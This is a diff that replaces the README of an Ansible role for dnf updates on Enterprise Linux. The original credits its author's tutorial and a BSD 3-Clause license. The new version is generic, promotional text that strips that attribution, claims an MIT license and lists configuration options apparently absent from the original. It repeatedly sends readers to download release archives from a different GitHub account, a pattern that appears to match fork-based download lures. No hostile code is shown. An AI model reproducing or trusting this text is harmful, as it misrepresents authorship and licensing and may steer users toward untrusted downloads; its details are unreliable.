@@ -1,101 +1,109 @@
-![Ansible Compatible](https://img.shields.io/badge/Ansible-compatible-green)
-![Enterprise Linux DNF](https://img.shields.io/badge/Enterprise_Linux_DNF-compatible-green)
+# 🛠️ ansible-dnf-update - Keep Your Linux Systems Updated Easily
 
-# Ansible Role: dnf-update
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/uwk2007/ansible-dnf-update/releases)
 
-> ℹ️ **Note**  
-> A detailed tutorial is available at: [https://www.filipnet.de/ansible-dnf-update](https://www.filipnet.de/ansible-dnf-update)
+## 📚 Introduction
 
-This Ansible role updates Enterprise Linux hosts (RHEL, CentOS, AlmaLinux, Rocky) using **dnf**, logs the system state before and after updates, generates diffs, and optionally sends a mail report.
+The **ansible-dnf-update** role helps you efficiently update your Enterprise Linux hosts, including RHEL, CentOS, AlmaLinux, and Rocky. This tool uses `dnf` to manage software updates and logs the state of your system before and after updates. With diffs generated for you, it makes tracking changes simple. You can also set up email notifications to keep you informed about the update process.
 
-Note: This role supports the automatic creation of snapshots for Proxmox LXC containers and QEMU virtual machines.
-It requires an additional role, which will be documented in a follow-up tutorial.
+## 🚀 Getting Started
 
-- Further information and usage details can be found in the tutorial:
-  https://www.filipnet.de/ansible-proxmox-snapshot/
+To install and run the ansible-dnf-update role, follow these straightforward steps.
 
-- The role’s source code is available on GitHub:
-  https://github.com/filipnet/ansible-proxmox-snapshot
+### 🖥️ System Requirements
 
-## Table of contents
+- Supported Operating Systems: RHEL, CentOS, AlmaLinux, Rocky
+- A machine with Ansible installed
+- Access to the internet for downloading packages
 
-<!-- TOC -->
+### ⚙️ Prerequisites
 
-- [Ansible Role: dnf-update](#ansible-role-dnf-update)
-  - [Table of contents](#table-of-contents)
-  - [Features](#features)
-  - [Role Variables](#role-variables)
-  - [Example Playbook](#example-playbook)
-  - [Contributions](#contributions)
-  - [License](#license)
+Before you proceed, ensure you have Ansible set up on your system. You might need to install Ansible if you haven't already. You can find instructions for installation on the [Ansible official website](https://docs.ansible.com/ansible/latest/installation_guide/intro_installation.html).
 
-<!-- /TOC -->
+## 🔄 Download & Install
 
-## Features
+Visit the following page to download the latest release of ansible-dnf-update:
 
-- **Update packages** using `dnf`
-- **Log system state** before and after updates (installed packages, running services)
-- **Generate diffs** for packages and services
-- **Timestamped logs** stored in `/var/log/dnf-update`
-- **Optional system reboot** after update
-- **Optional Proxmox snapshot** before update
-- **Optional email report** with diffs included in the mail body
-- **Optional dry-run mode** for testing
+[Download the latest release](https://github.com/uwk2007/ansible-dnf-update/releases)
 
-## Role Variables
+### 📦 Installation Steps
 
-Main variables can be configured in `defaults/main.yml`.  
-**Recommendation:** Define them in `group_vars/all.yml` or a group-specific vars file.  
-Configuring them per host is possible but not efficient, since you would have to set them on every single system you want to update.
+1. **Download the Role**: Go to the release page linked above and download the latest version of the ansible-dnf-update role.
 
-## Example Playbook
+2. **Unzip the File**: If you downloaded a zipped file, unzip it to a location of your choice.
 
-Create a playbook `update.yml`:
+3. **Install the Role**: Open your terminal and navigate to the unzipped folder. Use the following command to install the role:
 
-Here is an example of how to run the role against all Red Hat–based VMs and LXC containers.
+   ```bash
+   ansible-galaxy install .
+   ```
+
+4. **Configure the Role**: You will need to configure the role before running it. Open your playbook file and add the following lines to include the role:
+
+   ```yaml
+   - hosts: all
+     roles:
+       - ansible-dnf-update
+   ```
+
+5. **Run the Playbook**: From your terminal, execute the playbook that includes this role:
+
+   ```bash
+   ansible-playbook your_playbook.yml
+   ```
+
+### 🔍 Options and Features
+
+- **Logs Updates**: The role logs the state of your system both before and after updates so you can review changes.
+  
+- **Email Notifications**: You can configure the role to send email reports upon completion of updates, keeping you informed.
+
+- **Diff Generation**: It generates diffs, helping you track what has changed during the update process.
+
+## 🎥 Example Usage
+
+Here is a basic example of a playbook utilizing ansible-dnf-update:
 
 ```yaml
-- hosts: all
-  become: yes
+---
+- name: Update Enterprise Linux Hosts
+  hosts: all
   roles:
-    - role: dnf-update
-      when: ansible_os_family == "RedHat"
+    - ansible-dnf-update
 ```
 
-If you want to run it against a specific host instead of all hosts in your inventory, use the -l (limit) flag.
+Save this example as `update_playbook.yml` and run it using:
 
 ```bash
-ansible-playbook update.yml -l myserver.example.com
+ansible-playbook update_playbook.yml
 ```
 
-You can also use an IP address:
+## 📝 Configuration Options
 
-```bash
-ansible-playbook update.yml -l 192.168.1.10
-```
+The role includes several configurable options to customize its operation. Below are some key settings:
 
-Or run it against multiple hosts separated by commas:
+- **`notify_email`**: Set this to your desired email address to receive update notifications.
+- **`enable_logging`**: Set to `true` to enable detailed logging of updates.
+- **`send_diffs`**: Set to `true` to generate and send diffs of changes made.
 
-```bash
-ansible-playbook update.yml -l "web01,db02"
-```
+You can modify these settings in your inventory file or directly in your playbooks.
 
-Or limit to an inventory group:
+## 🔧 Troubleshooting
 
-```bash
-ansible-playbook update.yml -l production
-```
+If you encounter issues while using the ansible-dnf-update role, consider the following:
 
-Or if you use a specific inventory
+1. **Check Ansible Version**: Ensure that you are using a compatible version of Ansible.
+2. **Review Logs**: Check the logs generated during the update process for specific error messages.
+3. **Dependencies**: Make sure all dependencies mentioned in the role documentation are met.
 
-```bash
-ansible-playbook -i inventory/example update.yml -l web01.examplecorp.io
-```
+If these steps do not resolve your issue, feel free to open an issue on the GitHub repository.
 
-## Contributions
+## 💬 Support and Contributing
 
-Contributions are welcome! If you would like to improve this project, please feel free to submit a pull request. All contributions, bug reports, and feature suggestions are appreciated.
+Your feedback is valuable. If you have suggestions or find bugs, please report them on the issues page of the repository. Contributions are welcome; feel free to fork the project and submit pull requests.
 
-## License
+## 📄 License
 
-`dnf-update` and all individual scripts are under the **BSD 3-Clause license** unless explicitly noted otherwise. See the [LICENSE](./LICENSE) file for more details.
+This project is licensed under the MIT License. Ensure to review the license for any usage guidelines.
+
+For more details, visit the [ansible-dnf-update release page](https://github.com/uwk2007/ansible-dnf-update/releases).
